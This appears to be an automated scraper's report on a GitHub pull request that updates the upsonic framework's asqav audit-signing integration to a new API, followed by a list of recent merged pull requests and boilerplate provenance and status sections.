- start_session(): takes no args, remove name/metadata
- Replace session.log() with agent.sign(action_type, context)
- Replace export_audit(format) with export_audit_json()/export_audit_csv()
- Replace session.end() with agent.end_session()
- Remove unused SimpleSpanProcessor import
- Remove unverified EU AI Act Article 12 compliance claim

**File**: `src/upsonic/integrations/asqav.py` (modified, +36/-29)
```diff
@@ -13,7 +13,7 @@
     agent.print_do("Analyze quarterly revenue data")
 
     # Export audit trail
-    gov.export_audit("json")
+    gov.export_audit_json()
 """
 
 from __future__ import annotations
@@ -33,7 +33,7 @@ class AsqavGovernance(TracingProvider):
     Extends the standard tracing pipeline with cryptographic signing.
     Every span (tool call, agent step, LLM invocation) gets an ML-DSA-65
     signature chained to the previous action, creating a tamper-evident
-    audit trail suitable for EU AI Act Article 12 compliance.
+    audit trail.
 
     Args:
         api_key: Asqav API key (``sk_...``).
@@ -86,13 +86,10 @@ def _init_asqav(self) -> None:
         try:
             import asqav
 
-            asqav.init(api_key=self._api_key, api_url=self._endpoint)
+            asqav.init(api_key=self._api_key, base_url=self._endpoint)
             self._asqav = asqav
             self._agent = asqav.Agent.create(self._agent_name)
-            self._session = self._agent.start_session(
-                name="upsonic-session",
-                metadata={"framework": "upsonic"},
-            )
+            self._session = self._agent.start_session()
         except ImportError:
             raise ImportError(
                 "asqav is required for AsqavGovernance. "
@@ -105,40 +102,49 @@ def _init_asqav(self) -> None:
 
     def _create_exporter(self) -> _SpanExporter:
         """Create an OTLP exporter that also signs spans via asqav."""
-        from opentelemetry.sdk.trace.export import SimpleSpanProcessor
         from opentelemetry.sdk.trace.export.in_memory import InMemorySpanExporter
 
         # Use in-memory exporter as base - we process spans for signing
         exporter = InMemorySpanExporter()
         return _AsqavSigningExporter(
             inner=exporter,
-            session=self._session,
+            agent=self._agent,
             sign_tool_calls=self._sign_tool_calls,
             sign_llm_calls=self._sign_llm_calls,
             sign_agent_steps=self._sign_agent_steps,
         )
 
-    def export_audit(self, format: str = "json") -> Optional[bytes]:
-        """Export the audit trail as JSON or CSV.
+    def export_audit_json(self) -> Optional[dict]:
+        """Export the audit trail as JSON.
+
+        Returns:
+            Audit trail data as a dict, or None if export fails.
+        """
+        if self._asqav is None:
+            return None
+        try:
+            return self._asqav.export_audit_json()
+        except Exception:
+            return None
 
-        Args:
-            format: Export format (``"json"`` or ``"csv"``).
+    def export_audit_csv(self) -> Optional[str]:
+        """Export the audit trail as CSV.
 
         Returns:
-            Audit trail data as bytes, or None if export fails.
+            Audit trail data as a CSV string, or None if export fails.
         """
         if self._asqav is None:
             return None
         try:
-            return self._asqav.export_audit(format)
+            return self._asqav.export_audit_csv()
         except Exception:
             return None
 
     def shutdown(self) -> None:
         """End the asqav session and shut down tracing."""
-        if self._session is not None:
+        if self._agent is not None and self._agent._session_id is not None:
             try:
-                self._session.end()
+                self._agent.end_session()
             except Exception:
                 pass
         super().shutdown()
@@ -150,20 +156,20 @@ class _AsqavSigningExporter:
     def __init__(
         self,
         inner: Any,
-        session: Any,
+        agent: Any,
         sign_tool_calls: bool = True,
         sign_llm_calls: bool = True,
         sign_agent_steps: bool = True,
     ) -> None:
         self._inner = inner
-        self._session = session
+        self._agent = agent
         self._sign_tool_calls = sign_tool_calls
         self._sign_llm_calls = sign_llm_calls
         self._sign_agent_steps = sign_agent_steps
 
     def export(self, spans: Any) -> Any:
         """Sign relevant spans and forward to inner exporter."""
-        if self._session is not None:
+        if self._agent is not None:
             for span in spans:
                 self._maybe_sign(span)
         return self._inner.export(spans)
@@ -173,21 +179,22 @@ def _maybe_sign(self, span: Any) -> None:
         try:
             name = span.name or ""
             attrs = dict(span.attributes or {})
+            context = {k: str(v) for k, v in attrs.items()}
 
             if "tool" in name.lower() and self._sign_tool_calls:
-                self._session.log(
-                    f"tool:{name}",
-                    metadata={k: str(v) for k, v in attrs.items()},
+                self._agent.sign(
+                    action_type=f"tool:{name}",
+                    context=context,
                 )
             elif "llm" in name.lower() and self._sign_llm_calls:
-                self._session.log(
-  
```

#### Recent Merged Pull Requests:
- **PR #623** (closed): fix(security): isolate MCP stdio server from full os.environ (@Solaris-star)
- **PR #618** (2026-06-18): docs(community): add code of conduct (@IremOztimur)
- **PR #615** (2026-06-15): docs: add SECURITY.md with responsible disclosure policy (@IremOztimur)
- **PR #605** (2026-05-19): chore(master): release 0.77.3 (@github-actions[bot])
- **PR #604** (2026-05-19): New Centralized Usage Metrics (@onuratakan)
- **PR #602** (2026-05-19): TECH-1625: Centralized Usage Registry (replaces legacy incr chain + price_id) (@onuratakan)
- **PR #599** (2026-05-16): chore(master): release 0.77.2 (@github-actions[bot])
- **PR #598** (2026-05-16): fix(chat,messages): tolerate trailing junk in tool args and reset tas… (@onuratakan)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
